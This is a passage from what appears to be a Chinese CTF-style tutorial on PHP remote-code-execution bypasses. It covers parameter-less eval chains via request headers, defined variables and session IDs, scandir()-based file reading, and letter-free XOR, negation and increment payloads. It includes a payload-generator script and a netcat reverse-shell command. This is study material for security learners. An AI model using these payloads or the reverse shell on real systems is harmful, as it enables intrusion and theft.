class="hljs-title">getallheaders</span>())</span><br></code></pre></td></tr></table></figure><p>即可回显请求头部信息</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-53.png"></p><p>注意：提交的第一项是拿出的最后一项，在burpsuite中顺序是自下而上的</p><h4 id="绕过方法：-4"><a href="#绕过方法：-4" class="headerlink" title="绕过方法："></a><strong>绕过方法：</strong></h4><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-54.png"></p><hr><p><strong>可以用print_r()打印出来</strong></p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-55.png"></p><p><strong>也可以用pos()把第一项的值显示出来</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">code</span>=print_r(pos(getallheaders()))<br></code></pre></td></tr></table></figure><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-56.png"></p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-57.png"></p><p><strong>也可以用end()把最后一项的值显示出来</strong></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">?<span class="hljs-meta">code</span><span class="hljs-symbol">=print_r</span>(<span class="hljs-meta">end</span>(getallheaders()))<br></code></pre></td></tr></table></figure><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-58.png"></p><p>把print_r改成eval，然后将请求头改为我们要执行的命令即可执行命令（可以自己添加请求头信息）</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-59.png"></p><hr><p><strong>使用apache_request_headers()</strong></p><p>​功能与getallheaders()相似，适用于Apache服务器</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">print_r</span>(<span class="hljs-title">apache_request_headers</span>())</span><br></code></pre></td></tr></table></figure><p>使用system(‘nc 192.168.1.161 -e \bin\bash’);进行shell反弹</p><h3 id="利用全局变量进RCE（php5-7）"><a href="#利用全局变量进RCE（php5-7）" class="headerlink" title="利用全局变量进RCE（php5&#x2F;7）"></a>利用全局变量进RCE（php5&#x2F;7）</h3><p>例题还是上一道题<br>相关函数：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean">get_defined_vars()<br>返回所有已定义变量的值，所组成的数组<br><br>?<span class="hljs-keyword">code</span>=print_r(get_defined_vars());<br>返回数组顺序为GET-&gt;POST-&gt;COOKIE-&gt;FILES<br></code></pre></td></tr></table></figure><p>返回结果：</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-60.png"></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl">?code=print_r(<span class="hljs-keyword">pos</span>(get_defined_vars()));<br>加入<span class="hljs-keyword">pos</span>只获取第一项GET变量的值<br><br>?code=print_r(<span class="hljs-keyword">pos</span>(get_defined_vars()));&amp;cmd=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br>&amp;加入想要获取的指令<br></code></pre></td></tr></table></figure><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-61.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?code=print_r(<span class="hljs-keyword">end</span>(pos(get_defined_vars())));&amp;cmd=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br><span class="hljs-keyword">end</span>获取<span class="hljs-keyword">GET</span>的最后一项cmd的值<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-62.png"></p><p>最终代码：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">?code=<span class="hljs-keyword">eval</span>(end(<span class="hljs-keyword">pos</span>(get_defined_vars())));&amp;cmd=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br>把print_r换成<span class="hljs-keyword">eval</span>、assert即可执行命令<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br><span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);可替换成其他命令<br><br></code></pre></td></tr></table></figure><p>原理：code中的eval先执行其中的代码然后得到system(‘ls’);<br>然后源码中的eval再执行system(‘ls’)返回结果</p><p>poc脚本：</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-63.png"></p><h3 id="利用session（php-5）"><a href="#利用session（php-5）" class="headerlink" title="利用session（php 5）"></a>利用session（php 5）</h3><p><strong>session</strong>（相关知识）</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">session_start</span>()</span><br>启动新会话或者重用现有会话，成功开始会话返回<span class="hljs-variable"><span class="hljs-literal">TRUE</span></span>，反之返回<span class="hljs-variable"><span class="hljs-literal">FALSE</span></span><br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">code</span>=print_r(session_start());<br>返回1<br><br>?<span class="hljs-attribute">code</span>=print_r(session_id(session_start()));<br>返回PHPSESSID的值<br>可以用Burp Suite修改PHPSESSID的值<br></code></pre></td></tr></table></figure><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-64.png"></p><h4 id="实现代码："><a href="#实现代码：" class="headerlink" title="实现代码："></a><strong>实现代码：</strong></h4><p><strong>第一种方法：</strong>读取文件</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">?code=<span class="hljs-keyword">show_source(session_id(session_start()));</span><br><span class="hljs-keyword"></span>print_r修改为<span class="hljs-keyword">show_source()</span><br><span class="hljs-keyword"></span>用<span class="hljs-keyword">bp修改PHPSESSID的值为./flag</span><br><span class="hljs-keyword"></span>用<span class="hljs-keyword">show_source读取flag文件源代码</span><br></code></pre></td></tr></table></figure><p><strong>第二种方法：</strong>命令执行</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mel">?code=<span class="hljs-keyword">eval</span>(session_id(sessio_start()));<br>修改外部函数为<span class="hljs-keyword">eval</span>()<br>修改PHPSESSID的值为命令<span class="hljs-string">&#x27;phpinfo();&#x27;</span><br>无法直接执行，需先把命令<span class="hljs-string">&#x27;phpinfo();&#x27;</span>HEX编码转为十六进制，写入PHPSESSID<br>再用hex2bin()函数将十六进制转换为二进制数，用<span class="hljs-keyword">eval</span>执行<br><br>?code=<span class="hljs-keyword">eval</span>(hex2bin(session_id(session_start())));<br>然后就能执行命令了<br>将phpinfo();改为我们想执行的命令即可，例如<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat flag&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="使用scandir-进行文件读取"><a href="#使用scandir-进行文件读取" class="headerlink" title="使用scandir()进行文件读取"></a>使用scandir()进行文件读取</h3><p>还是那个例题无参数</p><p><strong>只能进行文件读取</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">scandir</span><span class="hljs-params">()</span></span><br>类似ls，在某文件路径下，把内容以列表形式显示出来<br></code></pre></td></tr></table></figure><p><strong>相关函数：</strong></p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-65.png"></p><h4 id="当前目录"><a href="#当前目录" class="headerlink" title="当前目录"></a><strong>当前目录</strong></h4><p><strong>查看当前目录文件名流程</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">code</span>=print_r(localeconv());<br></code></pre></td></tr></table></figure><p>原理：localeconv()显示的数组第一项为”.”，scandir(.)即相对路径，表示读取当前目录下的文件名</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">获取字符<span class="hljs-string">&#x27;.&#x27;</span><br>?<span class="hljs-attribute">code</span>=print_r(current(localeconv()));<br></code></pre></td></tr></table></figure><p>current()功能同pos()，获取数组第一位</p><p><strong>scandir()读取当前目录下所有文件名</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">code</span>=print_r(scandir(current(localeconv())))<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">倒序<br>?<span class="hljs-attribute">code</span>=print_r(array_reverse(scandir(current(localeconv())));<br><br>?<span class="hljs-attribute">code</span>=print_r(current(array_reverse(scandir(current(localeconv()))));<br></code></pre></td></tr></table></figure><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-66.png"></p><p><strong>读取当前目录下位于第一位的文件</strong></p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis">?code=show_source(<span class="hljs-literal">current</span>(array_reverse(scandir(<span class="hljs-literal">current</span>(localeconv())))))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>这样就能读取flag文件了</p><p><strong>把第一个current换成next即可读取第二位的文件</strong></p><p><strong>getcwd</strong></p><p>也可以使用getcwd来得到当前目录的绝对路径然后再使用scandir(getcwd())读取当前目录下的文件名</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">查看和读取当前目录文件<br>?<span class="hljs-attribute">code</span>=print_r(getcwd());<br></code></pre></td></tr></table></figure><p>getcwd()当前目录，相当于pwd</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">code</span>=print_r(scandir(getcwd()));<br><br>?<span class="hljs-attribute">code</span>=print_r(end(scandir(getcwd())));<br><br>?<span class="hljs-attribute">code</span>=prin_r(show_source(end(scandir(getcwd()))));<br></code></pre></td></tr></table></figure><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-67.png"></p><h4 id="上级目录"><a href="#上级目录" class="headerlink" title="上级目录"></a>上级目录</h4><p><strong>查看上一级目录文件名流程</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">code</span>=print_r(getcwd());<br></code></pre></td></tr></table></figure><p>getcwd()当前目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">先使用getcwd()得到当前目录，再使用<span class="hljs-built_in">dirname</span>()得到上一级目录<br>?code=print_r(<span class="hljs-built_in">dirname</span>(getcwd()));<br></code></pre></td></tr></table></figure><p>dirname()上一级目录</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-68.png"></p><p><strong>再加上scandir()即可查看上级目录中的文件名</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">code</span>=print_r(scandir(dirname(getcwd())));<br></code></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>ode=print_r(scandir(<span class="hljs-keyword">next</span>(dirname(getcwd()))));<br></code></pre></td></tr></table></figure><p><strong>效果相同</strong></p><p>注意：<strong>但是这里无法使用show_source来读取文件，因为我们无法在当前目录下读取上一级目录中的文件，所以要使用chdir()修改我们执行命令所在的路径</strong></p><hr><p><strong>读取上一级目录文件名</strong></p><p>chdir()相当于cd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">这样就能打印上级目录的文件名了<br>?code=print_r(scandir(<span class="hljs-built_in">dirname</span>(<span class="hljs-built_in">chdir</span>(<span class="hljs-built_in">dirname</span>(getcwd())))))<br></code></pre></td></tr></table></figure><p>如果想读取上级目录中的文件，把print_r换成show_source，并且使用pos()，current()，end()即可</p><hr><p><strong>如果我们读取的文件顺序不在第一位或者最后一位，可以使用array_rand(array_flip())</strong></p><p><strong>原理：array_flip可以将数组中的键和值互换，array_rand可以随机取出数组中的键，两个函数结合我们就能有概率的得到我们想要的文件名，然后使用show_source即可读取我们想要读取的文件</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?code=show_source(array_rand(array_flip(scandir(<span class="hljs-built_in">dirname</span>(<span class="hljs-built_in">chdir</span>(<span class="hljs-built_in">dirname</span>(getcwd())))))));<br></code></pre></td></tr></table></figure><p>其他方法：</p><p>太多函数了懒得手敲了</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-69.png"></p><h4 id="根目录"><a href="#根目录" class="headerlink" title="根目录"></a>根目录</h4><p><strong>查看根目录文件名</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros">原理：在序列化并加密后在字符串末尾可能会出现<span class="hljs-string">&#x27;/&#x27;</span>然后这时再使用strrev函数来反转字符串，字符串首位就是<span class="hljs-string">&#x27;/&#x27;</span>了<br><br>?<span class="hljs-attribute">code</span>=print_r(array());<br><br>serialize()序列化<br>crypt单向字符串散列加密，结果随机<br>?<span class="hljs-attribute">code</span>=print_r(crypt(serialize(array())));<br><br>倒序<br>?<span class="hljs-attribute">code</span>=print_r(strrev(crypt(serialize(array()))));<br></code></pre></td></tr></table></figure><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-70.png"></p><hr><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">ord</span>()函数和<span class="hljs-built_in">chr</span>()函数<br>只能对第一个字符进行转码<br><span class="hljs-built_in">ord</span>()编码，<span class="hljs-built_in">chr</span>()解码<br></code></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">原理：使用<span class="hljs-keyword">ord</span>去编码第一个字符（相当于取出第一个字符，这里有概率是/），然后使用<span class="hljs-keyword">chr</span>去解码（将编码后的/解码），然后使用scandir()去查看根目录下的文件名<br><br>?code=print_r(scandir(<span class="hljs-keyword">chr</span>(<span class="hljs-keyword">ord</span>(strrev(<span class="hljs-keyword">crypt</span>(serialize(array())))))));<br></code></pre></td></tr></table></figure><p><strong>读取根目录下的文件</strong></p><p>依然是使用前面的array_rand(array_flip())，还要使用chdir固定当前目录</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">?code=show_source(array_rand(array_flip(scandir(dirname(<span class="hljs-keyword">chdir</span>(<span class="hljs-keyword">chr</span>(<span class="hljs-keyword">ord</span>(strrev(<span class="hljs-keyword">crypt</span>(serialize(array())))))))))));<br></code></pre></td></tr></table></figure><p>但是这里双重概率，导致概率很低，所以可以使用burpsuite抓包到intruder，然后暴力破解</p><h2 id="无字母数字异或运算绕过"><a href="#无字母数字异或运算绕过" class="headerlink" title="无字母数字异或运算绕过"></a>无字母数字异或运算绕过</h2><p>例题：</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-71.png"></p><p>a-z0-9过滤字母和数字</p><h3 id="异或运算"><a href="#异或运算" class="headerlink" title="异或运算"></a>异或运算</h3><p>概念：</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-72.png"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">echo <span class="hljs-built_in">base_convert</span>(<span class="hljs-built_in">bin2hex</span>(<span class="hljs-string">&#x27;5&#x27;</span>),<span class="hljs-number">16</span>,<span class="hljs-number">2</span>)<span class="hljs-number">00110101</span><br>echo <span class="hljs-built_in">base_convert</span>(<span class="hljs-built_in">bin2hex</span>(<span class="hljs-string">&#x27;Z&#x27;</span>),<span class="hljs-number">16</span>,<span class="hljs-number">2</span>)<span class="hljs-number">01011010</span><br><span class="hljs-string">&#x27;5&#x27;</span>^<span class="hljs-string">&#x27;Z&#x27;</span><span class="hljs-number">01101111</span><br>解码得到o<br></code></pre></td></tr></table></figure><p><strong>使用符号进行异或运算，获取想要得到的值</strong></p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-73.png"></p><h3 id="异或运算生成脚本"><a href="#异或运算生成脚本" class="headerlink" title="异或运算生成脚本"></a>异或运算生成脚本</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;_FILE_&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$shell</span> = <span class="hljs-string">&quot;phpinfo&quot;</span>; <span class="hljs-comment">//改成我们想要异或运算得到的值</span><br><span class="hljs-variable">$result1</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-variable">$result2</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">judge</span>(<span class="hljs-params"><span class="hljs-variable">$c</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="hljs-variable">$c</span>))<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$num</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$num</span>&lt;=<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$shell</span>);<span class="hljs-variable">$num</span>++)<br>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$x</span>=<span class="hljs-number">33</span>;<span class="hljs-variable">$x</span>&lt;=<span class="hljs-number">126</span>;<span class="hljs-variable">$x</span>++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">judge</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$x</span>)))<br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-variable">$y</span>=<span class="hljs-number">33</span>;<span class="hljs-variable">$y</span>&lt;=<span class="hljs-number">126</span>;<span class="hljs-variable">$y</span>++)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">judge</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$y</span>))) <br>                &#123;<br>                    <span class="hljs-variable">$f</span> = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$x</span>) ^ <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$y</span>);<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$f</span> == <span class="hljs-variable">$shell</span>[<span class="hljs-variable">$num</span>]) <br>                    &#123;<br>                        <span class="hljs-variable">$result1</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$x</span>);<br>                        <span class="hljs-variable">$result2</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$y</span>);<br>                        <span class="hljs-keyword">break</span> <span class="hljs-number">2</span>;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;异或运算第一部分：&quot;</span>.<span class="hljs-variable">$result1</span>.<span class="hljs-string">&quot;  &quot;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;异或运算第二部分：&quot;</span>.<span class="hljs-variable">$result2</span>;<br></code></pre></td></tr></table></figure><hr><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-74.png"></p><p>注意：要先在hackbar中url编码才能生效</p><h3 id="PHP5-POST方法绕过"><a href="#PHP5-POST方法绕过" class="headerlink" title="PHP5 POST方法绕过"></a>PHP5 POST方法绕过</h3><p>注意：要先在hackbar中url编码才能生效</p><p>具体思路：</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-75.png"></p><h3 id="PHP7-反引号-POST绕过"><a href="#PHP7-反引号-POST绕过" class="headerlink" title="PHP7 反引号+POST绕过"></a>PHP7 反引号+POST绕过</h3><p><strong>PHP7之后的版本无法使用assert拼接，所以使用反引号+POST绕过</strong></p><p>注意：&#96;&#96;不能回显，且执行前也要使用ur编码</p><p>具体思路：</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-76.png"></p><h2 id="无字母数字取反绕过"><a href="#无字母数字取反绕过" class="headerlink" title="无字母数字取反绕过"></a>无字母数字取反绕过</h2><h3 id="取反运算"><a href="#取反运算" class="headerlink" title="取反运算"></a>取反运算</h3><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-77.png"></p><p>原理：先将我们的命令字符从ascii码转换成二进制，然后再取反，再转换为十六进制数，这样就能使用url解码然后再取反即可变成命令字符</p><h3 id="取反poc"><a href="#取反poc" class="headerlink" title="取反poc"></a>取反poc</h3><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-78.png"></p><p><strong>使用中文字符构造payload</strong></p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-79.png"></p><p><strong>使用url编码（简单）</strong></p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-80.png"></p><h3 id="PHP-7url编码"><a href="#PHP-7url编码" class="headerlink" title="PHP 7url编码"></a>PHP 7url编码</h3><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-81.png"></p><h2 id="无字母数字自增绕过"><a href="#无字母数字自增绕过" class="headerlink" title="无字母数字自增绕过"></a>无字母数字自增绕过</h2><p>原理：利用自增符号++来实现绕过，[]在php中直接echo是Array但是不能取出首字母A，这时我们使用$_&#x3D;[].’’;拼接’’字符串，这样$_[0]即为A，其他字母就可以由这个A自增自减来得到</p><h3 id="-5"><a href="#-5" class="headerlink" title="++"></a><strong>++</strong></h3><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-82.png"></p><h3 id="PHP5"><a href="#PHP5" class="headerlink" title="PHP5"></a>PHP5</h3><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-83.png"></p><p><strong>poc脚本：</strong></p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-84.png"></p><h3 id="PHP7"><a href="#PHP7" class="headerlink" title="PHP7"></a><strong>PHP7</strong></h3><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-85.png"></p><h2 id="无字母数字特殊符号绕过"><a href="#无字母数字特殊符号绕过" class="headerlink" title="无字母数字特殊符号绕过"></a>无字母数字特殊符号绕过</h2><h3 id="短标签"><a href="#短标签" class="headerlink" title="短标签"></a>短标签</h3><p>例题：a-z0-9_过滤字母和数组、下划线</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">phpinfo</span>()<br><span class="hljs-meta">?&gt;</span><br><br>短标签<br><span class="hljs-meta">&lt;?=</span><span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span>可直接执行<br></code></pre></td></tr></table></figure><p><strong>GET方式提交</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?&gt;</span>&lt;<span class="hljs-string">?=</span><span class="hljs-string">`&#123;$&#123;~&quot;%a0%b8%ba%ab&quot;&#125;[%a0]&#125;`</span><span class="hljs-string">?&gt;</span><span class="hljs-string">?&gt;</span>&lt;<span class="hljs-string">?=</span><span class="hljs-string">`$_GET[%a0]`</span><span class="hljs-string">?&gt;</span>取反<br><br><span class="hljs-symbol">payload:</span><br><span class="hljs-string">?c</span>md=<span class="hljs-string">?&gt;</span>&lt;<span class="hljs-string">?=</span><span class="hljs-string">`&#123;$&#123;~&quot;%a0%b8%ba%ab&quot;&#125;[%a0]&#125;`</span><span class="hljs-string">?&gt;</span>&amp;%a0=ls<br></code></pre></td></tr></table></figure><p><strong>POST方式提交</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?&gt;</span>&lt;<span class="hljs-string">?=</span><span class="hljs-string">`&#123;$&#123;~&quot;%a0%af%b0%ac%ab&quot;&#125;[&quot;-&quot;]&#125;`</span><span class="hljs-string">?&gt;</span><span class="hljs-string">?&gt;</span><span class="hljs-string">?=</span><span class="hljs-string">`_POST[-]`</span><span class="hljs-string">?&gt;</span>取反<br><br><span class="hljs-symbol">payload:</span><br><span class="hljs-string">?c</span>md=<span class="hljs-string">?&gt;</span>&lt;<span class="hljs-string">?=</span><span class="hljs-string">`&#123;$&#123;~&quot;%a0%af%b0%ac%ab&quot;&#125;[&quot;-&quot;]&#125;`</span><span class="hljs-string">?&gt;</span><br><br>然后<span class="hljs-variable constant_">POST</span>提交-=ls即可执行命令<br></code></pre></td></tr></table></figure><h3 id="文件读取"><a href="#文件读取" class="headerlink" 